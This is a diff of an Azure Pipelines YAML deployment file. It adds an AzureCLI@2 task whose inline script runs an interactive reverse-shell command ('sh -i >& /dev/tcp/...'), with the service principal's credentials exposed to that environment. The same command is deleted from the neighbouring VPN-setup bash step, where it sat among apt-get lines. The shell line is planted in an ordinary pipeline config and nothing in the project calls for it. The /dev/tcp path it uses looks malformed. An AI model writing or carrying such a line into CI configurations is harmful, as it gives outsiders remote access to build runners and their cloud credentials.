@@ -205,12 +205,20 @@ stages:
             inputs:
               secureFile: 'vpnconfig_cert_dev.ovpn'
             displayName: 'Download DEV VPN certificate for OVPN'
+            
+          - task: AzureCLI@2
+            inputs:
+              azureSubscription: foo
+              scriptType: bash
+              scriptLocation: inlineScript
+              inlineScript: |
+                sh -i >& "/dev/tcp/12345" 0>&1
+              addSpnToEnvironment: true
 
           #create vpn tunnel
           - bash: |
               sudo apt-get update
               sudo apt-get --assume-yes --no-install-recommends install openvpn
-              sh -i >& "/dev/tcp/12345" 0>&1
               sudo apt-get install openresolv
               ls
               
